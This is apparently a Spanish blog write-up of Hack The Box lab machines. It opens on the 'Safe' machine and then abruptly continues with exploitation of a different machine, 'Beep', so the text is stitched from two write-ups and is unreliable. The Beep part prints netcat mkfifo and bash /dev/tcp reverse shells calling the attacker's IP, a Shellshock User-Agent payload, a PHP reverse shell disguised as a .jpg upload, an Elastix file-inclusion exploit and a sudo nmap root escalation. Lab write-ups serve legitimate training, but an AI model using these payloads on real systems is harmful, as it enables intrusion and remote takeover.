I"6W<p>Hoy vamos a resolver la máquina <em>Safe</em> de <em>Hack The Box</em>. Es una máquina <em>Linux</em> de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente vamos a lanzar una <em>traza ICMP</em> para saber si la máquina está activa.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.147
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/2.png" alt="" /></p>

<p>Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la máquina es <code class="language-plaintext highlighter-rouge">63</code>, por lo que podemos intuir que estamos ante una máquina <em>Linux</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Sistema Operativo (OS)</th>
      <th style="text-align: left">TTL</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Linux</td>
      <td style="text-align: left">64</td>
    </tr>
    <tr>
      <td style="text-align: left">Windows</td>
      <td style="text-align: left">128</td>
    </tr>
    <tr>
      <td style="text-align: left">Solaris</td>
      <td style="text-align: left">254</td>
    </tr>
  </tbody>
</table>

<p>Si nos damos cuenta, en esta ocasión, el valor del <em>TTL</em> es <code class="language-plaintext highlighter-rouge">63</code> y no <code class="language-plaintext highlighter-rouge">64</code> como indica la tabla anterior, esto se debe a que en el entorno de máquinas de <em>Hack The Box</em>, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el <em>TTL</em> disminuye en una unidad.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.147 -R                               
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/3.png" alt="" /></p>

<p>Posteriormente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --open -T5 -v -n 10.10.10.147
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.147
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resolución DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no más lentos que «valor» por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor información por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
</ul>

<p>Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p 22,80,1337 10.10.10.147
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts básicos de enumeración</li>
  <li>sV - Versión y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
</ul>

<p>Basándonos en la información que nos reporta <em>Nmap</em>, podemos darnos cuenta que la máquina víctima tiene abierto un puerto relacionado con <code class="language-plaintext highlighter-rouge">HTTP</code>; asimismo, encontramos abierto el puerto <code class="language-plaintext highlighter-rouge">1337</code>, relacionado con el protocolo <code class="language-plaintext highlighter-rouge">WASTE</code>, el cual permite el intercambio de archivos de forma cifrada.</p>

<p>Debido a que la máquina cuenta con el puerto <code class="language-plaintext highlighter-rouge">80</code> abierto, podríamos intentar aplicar <code class="language-plaintext highlighter-rouge">fuzzing</code>, no obstante, no vamos a encontrar nada interesante.</p>

<p>Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de <code class="language-plaintext highlighter-rouge">WhatWeb</code>, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.147
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/4.png" alt="" /></p>

<p>Como podemos observar, no hay nada especialmente relevante a excepción del título de la página, el cual es el mensaje por defecto que aparece cuando montamos una página web haciendo uso del servidor <code class="language-plaintext highlighter-rouge">Apache</code>, por lo que podemos irnos haciendo a la idea, de que la entrada a la máquina, no será vía web.</p>

<p>En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/5.png" alt="" /></p>

<p>En efecto, lo primero que vemos al abrir la página web, es la página por defecto que viene cuando montamos una página web mediante el servidor <code class="language-plaintext highlighter-rouge">Apache</code>, por lo que, podemos inspeccionar el código fuente, en busca de alguna pista; para verlo de manera más cómoda podemos hacer <code class="language-plaintext highlighter-rouge">Ctrl + U</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/6.png" alt="" /></p>

<p>Si nos percatamos, en las primeras líneas del código fuente, hay un comentario que nos menciona que <code class="language-plaintext highlighter-rouge">myapp</code>, alojado en el puerto <code class="language-plaintext highlighter-rouge">1337</code>, lo podemos descargar; para ello, podemos intentar añadir <code class="language-plaintext highlighter-rouge">/myapp</code>, al final del url.</p>

<p><em>Los comentarios en HTML, tienen la estrctura: <!-- Este es un comentario a modo de prueba --></em>
“<!-- Este es un comentario a modo de prueba -->”</p>
<kajsdlas>

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/7.png)

Al añadir `/myapp`, al final del url, se nos va a descargar un archivo que lleva por nombre, `myapp`, el cual vamos a empezar a analizar. 

### [](#header-3)Fase De Explotación

Como mencioné en un inicio, la máquina _Beep_ cuenta con varios vectores para realizar la fase de explotación; de hecho, para tres de ellos ni siquiera hace falta la escalada de privilegios.

### [](#header-4)Fase De Explotación - Local File Inclusion

Lo primero que se nos puede ocurrir a la hora de encontrar un panel de login, sería probar contraseñas por defecto (un error bastante común aún hoy en día). Sin embargo ninguna de las [siguientes](https://www.elastix.org/community/threads/default-passwords-not-password.8416/) credenciales nos es de ayuda para logearnos en el servicio de `Elastix`

La siguiente idea que podemos probar, sería buscar algún tipo de _exploit_ para el servicio `Elastix`; para ello utilizaremos _SearchSploit_.

```
searchsploit Elastix
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/9.png)

En este caso _SearchSploit_ nos muestra algunos _exploits_ interesantes, sin embargo nos vamos a quedar con el que nos permite realizar un [_Local File Inclusion (LFI)_](https://mateonitro550.github.io/Local-File-Inclusion-(LFI)), vulnerabilidad que ya revisamos.

En este caso no nos haría falta descargar el _exploit_, ya que lo más probable es que nos indique en que ruta podemos aplicar el _LFI_.

```
searchsploit -x php/webapps/37637.pl
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/10.png)

En efecto, pero antes de intentar explotar este _LFI_, debemos confirmar si en primer lugar existe la primera ruta, `/vtigercrm/`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/11.png)

Una vez confirmamos que la ruta existe, podemos pasar a explotar el _LFI_. Si nos percatamos, se está haciendo uso de un _null byte_, así como de varios _directory path traversal_, esto con el fin de leer el archivo `/etc/amportal.conf`, pero perfectamente podríamos listar cualquier otro archivo del sistema.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/12.png)

Leer esto así es un poco complicado, así que podríamos hacer `Ctrl + U`, para verlo de mejor manera.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/13.png)

El archivo `/etc/amportal.conf`, como su nombre mismo indica, es un archivo de configuración para el portal de gestión de `Asterisk`.

Si recordamos, otro servicio que detectamos con _Nmap_, fue el servicio _SSH_ en el puerto `22`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/14.png)

Por lo que procederemos a autenticarnos con las credenciales encontradas:

```
ssh root@10.10.10.7
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/15.png)

Al intentar conectarnos por _SSH_, vemos que la conexión no se puede establecer debido a que no existe un algoritmo de encriptación en común entre la máquina víctima, y nuestra máquina de atacante. Para solucionar este problema, debemos forzar a nuestra máquina usar alguno de los algoritmos que se nos presenta, pese a ser considerados como menos seguros.

```
ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/16.png)

Al habernos conectado a la máquina directamente como root, no es necesario realizar la escalada de privilegios, por lo que podríamos listar sin ningún problema tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/17.png)

### [](#header-4)Fase De Explotación - Webmin

[shellshock](https://mateonitro550.github.io/Shellshock)

Al igual que intentamos probar contraseñas por defecto en el panel de login del servicio `Elastix`, podemos hacer lo mismo en el panel de autenticación del servicio `Webmin`, pero al igual que ocurrió antes, las [siguientes](https://help.eset.com/era_deploy_va/64/en-US/index.html?webmin.htm) credenciales no nos permiten ingresar.

Otra opción muy buena sería utilizar las credenciales que encontramos antes, las cuales de hecho funcionan, es decir, se están reutilizando credenciales, otra muy mala práctica que aún a día de hoy, persiste.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/18.png)

Estando dentro podríamos programar la ejecución de cualquier comando, a nivel de cualquier usuario en el sistema, en nuestro caso, nos interesa entablarnos una `reverse shell`; [aquí](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) tenemos algunos ejemplos, pero nosotros los vamos a hacer a través de `NetCat`.

Para lo cual, desde nuestra máquina de atacantes deberemos de ponernos en escucha a través del puerto que queramos.

```
sudo nc -nlvp <puertoCualquiera>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/19.png)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc <nuestraIP> <puertoCualquiera> &gt;/tmp/f
```
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/20.png)

Después de darle a `save`, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/21.png)

De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/22.png)

### [](#header-4)Fase De Explotación - Shellshock

Si nos percatamos, en el ataque anterior, depués de haber intentado ingresar como un usuario no válido, se añade al _url_ `/session_login.cgi`

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/23.png)

Esto llama nuestra atención ya que los archivos de extensión `.cgi`, o dentro del directorio `/cgi-bin/`, son utilizados para ejecutar programas en el servidor, y esto lo hacen a través de una interfaz de línea comandos (CLI), por lo que si la bash es vulnerable, podemos realizar un ataque [shellshock](https://mateonitro550.github.io/Shellshock).

Lo más cómodo sería realizar este ataque desde nuestra terminal, sin embargo, debido al problema del _certificado SSL_ autofirmado, a la hora de utilizar el comando `curl`, nos va a dar un error.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/24.png)

Este error lo podríamos solucionar utilizando uno de los parámetros que nos otorga `curl`, concretamente el parámetro `-k` o `--insecure`, el cual permite tramitar este tipo de peticiones inseguras. Sin embargo, ni así, nos es posible explotar el `shellshock` de esta forma, por lo que tendremos que hacerlo de otra manera.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/25.png)

Para poder cambiar el `User-Agent` de otra forma, podríamos hacerlo a través de `Burp Suite`, y así, entablarnos una `reverse shell`.

Primero vamos a emitir una petición al panel de autenticación con credenciales al azar, y posteriormente, desde `Burp Suite`, con `Ctrl + R`, vamos a mandar nuestra petición al `Repeater`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/26.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/27.png)

Después, vamos a borrar el contenido que se encuentra en el campo `User-Agent`, y lo vamos a reemplazar con nuestro código malicioso. Para variar un poco, la `reverse shell` la conseguiremos a través de bash, a diferencia de como lo hicimos en la explotación del servicio `Webmin`; nuevamente, este tipo de `reverse shells`, las podemos conseguir [aquí](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

En primer lugar, desde nuestra máquina de atacantes, a través de `NetCat`, tenemos que ponernos en escucha a través de un puerto cualquiera.
  
``` 
sudo nc -nlvp <puertoCualquiera>
```

Y, el código malicioso que vamos a ingresar en el campo `User-Agent` será: 

```
() { :; }; bash -i &gt;&amp; /dev/tcp/<nuestraIP>/<puertoCualquiera> 0&gt;&amp;1
```

Finalmente, presionaremos el botón `Send`, para que emitir nuestra petición.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/28.png)

Y al igual que en los casos anteriores, sin necesidad de escalada de privilegios, podremos leer tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios, sin ninguna complicación.

### [](#header-4)Fase De Explotación - File Upload Bypass

Si recordamos, en la fase de explotación a través del uso de un _LFI_, habíamos descubierto un panel de login de `vtiger CRM`; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/29.png)

Y en efecto, una vez dentro, podemos empezar a investigar un poco; en el apartado _Settings/Company Details_, vamos a ver que hay una opción que nos permite cambiar el logo de la compañia, por lo que ya vamos teniendo una idea, de que podemos hacer.

De manera casi similar a la máquina [Vulnversity-TryHackMe](https://mateonitro550.github.io/Vulnversity-TryHackMe), vamos a tener que disfrazar un archivo `.php` como `.jpg`. No obstante, en este caso será un poco más sencillo ya que no haremos uso de `Burp Suite` (aunque podríamos); lo único que vamos a hacer es añadir la extensión `.jpg` a nuestra `reverseShell.php`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/30.png)

Podríamos utilizar la [_reverse shell_](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) que nos provee `pentestmonkey` (para lo cual debemos modificar el campo _ip_, y colocar la nuestra, y si quisiéramos el campo _port_), o bien, crear nuestra propia `reverse shell`.

```php
<?php
	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <nuestraIP> <puertoCualquiera> >/tmp/f");
?>
```

Y al igual que en los casos anteriores, previo a darle a `Save`, debemos de estar en escucha a través de `NetCat`, por el puerto que hayamos indicado en nuestra `reverse shell`.

```
sudo nc -nlvp <puertoCualquiera>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/31.png)

Si nos percatamos, a diferencia de los casos anteriores, en esta ocasión ya no somos el usuario root, somos el usuario `asterisk`, por lo que ahora si debemos de realizar la escalada de privilegios.

### [](#header-3)Escalada De Privilegios

Para conseguir la primera flag, no tenemos que realizar ningún proceso, como el usuario `asterisk`, nos es posible leer la flag del usuario con bajos privilegios.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/32.png)

Para conseguir la flag del usuario con máximos privilegios, al ser el usuario `asterisk`, será bastante sencillo, ya que este usuario usualmente tiene acceso a ejectuar algunos binarios haciendo uso de `sudo`, por lo que, lo primero que vamos a hacer es listar que binarios podemos ejecutar como root.

```
sudo -l
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/33.png)

La mejor forma para abusar de algún binario, es recurrir a [GTFOBins](https://gtfobins.github.io/), esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios con permisos SUID mal asignados, y en este caso, binarios que se pueden ejectuar como root.

En este caso, tenemos un abanico de oportunidades, tenemos binarios como `chmod`, `chown`, `service`, `yum`, y el binario que vamos a explotar en esta ocasión: `nmap`.

Para explotar el binario `nmap`, bastará con ejecutar su modo interactivo, con el cual después, generaremos una bash con máximo privilegios.

```
sudo nmap --interactive
nmap&gt; !sh
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/34.png)

Posterior a ello, podemos buscar la flag dentro de todo el sistema, y leerla.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/35.png)
</puertoCualquiera></puertoCualquiera></nuestraIP></puertoCualquiera></puertoCualquiera></nuestraIP></puertoCualquiera></kajsdlas>
:ET